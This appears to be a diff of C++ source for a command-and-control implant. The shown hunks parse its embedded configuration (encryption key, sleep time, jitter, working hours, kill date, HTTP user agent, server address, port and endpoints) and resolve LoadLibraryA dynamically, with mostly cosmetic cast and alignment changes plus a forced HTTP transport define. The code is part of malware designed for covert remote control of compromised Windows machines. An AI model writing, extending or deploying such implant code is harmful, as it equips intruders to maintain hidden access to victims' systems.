@@ -61,9 +61,9 @@ namespace Implant {
 
         //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->ConfigBytes.Key, FALSE);
 
-        Parser::ParserStrcpy(&Parser, REINTC(LPSTR*, &Ctx->Config.Key), nullptr);
-        Parser::ParserMemcpy(&Parser, REINTC(PBYTE*, &Ctx->Root), nullptr);
-        Parser::ParserMemcpy(&Parser, REINTC(PBYTE*, &Ctx->LE), nullptr);
+        Parser::ParserStrcpy(&Parser, RCAST(LPSTR*, &Ctx->Config.Key), nullptr);
+        Parser::ParserMemcpy(&Parser, RCAST(PBYTE*, &Ctx->Root), nullptr);
+        Parser::ParserMemcpy(&Parser, RCAST(PBYTE*, &Ctx->LE), nullptr);
 
         if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
             if (
@@ -114,16 +114,17 @@ namespace Implant {
         Parser::ParserStrcpy(&Parser, &Ctx->Config.Hostname, nullptr);
         Parser::ParserStrcpy(&Parser, &Ctx->Config.Domain, nullptr);
 
-        Ctx->Session.PeerId = Parser::UnpackDword(&Parser);
-        Ctx->Config.Sleeptime = Parser::UnpackDword(&Parser);
-        Ctx->Config.Jitter = Parser::UnpackDword(&Parser);
-        Ctx->Config.WorkingHours = Parser::UnpackDword(&Parser);
-        Ctx->Config.Killdate = Parser::UnpackDword64(&Parser);
+        Ctx->Session.PeerId         = Parser::UnpackDword(&Parser);
+        Ctx->Config.Sleeptime       = Parser::UnpackDword(&Parser);
+        Ctx->Config.Jitter          = Parser::UnpackDword(&Parser);
+        Ctx->Config.WorkingHours    = Parser::UnpackDword(&Parser);
+        Ctx->Config.Killdate        = Parser::UnpackDword64(&Parser);
 
         Ctx->Transport.OutboundQueue = nullptr;
 
+#define TRANSPORT_HTTP
 #ifdef TRANSPORT_HTTP
-        Ctx->Transport.http = (PHTTP_CONTEXT) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP_CONTEXT));
+        Ctx->Transport.http = SCAST(PHTTP_CONTEXT, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP_CONTEXT)));
 
         Ctx->Transport.http->Handle     = nullptr;
         Ctx->Transport.http->Endpoints  = nullptr;
@@ -132,9 +133,9 @@ namespace Implant {
         Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Useragent, nullptr);
         Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Address, nullptr  );
 
-        Ctx->Transport.http->Port = Parser::UnpackDword(&Parser);
+        Ctx->Transport.http->Port       = SCAST(INT, Parser::UnpackDword(&Parser));
         Ctx->Transport.http->nEndpoints = Parser::UnpackDword(&Parser);
-        Ctx->Transport.http->Endpoints = (LPWSTR*) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(LPWSTR) * ((Ctx->Transport.http->nEndpoints + 1) * 2));
+        Ctx->Transport.http->Endpoints  = SCAST(LPWSTR*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(LPWSTR) * ((Ctx->Transport.http->nEndpoints + 1) * 2)));
 
         for (auto i = 0; i < Ctx->Transport.http->nEndpoints; i++) {
             Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Endpoints[i], nullptr);
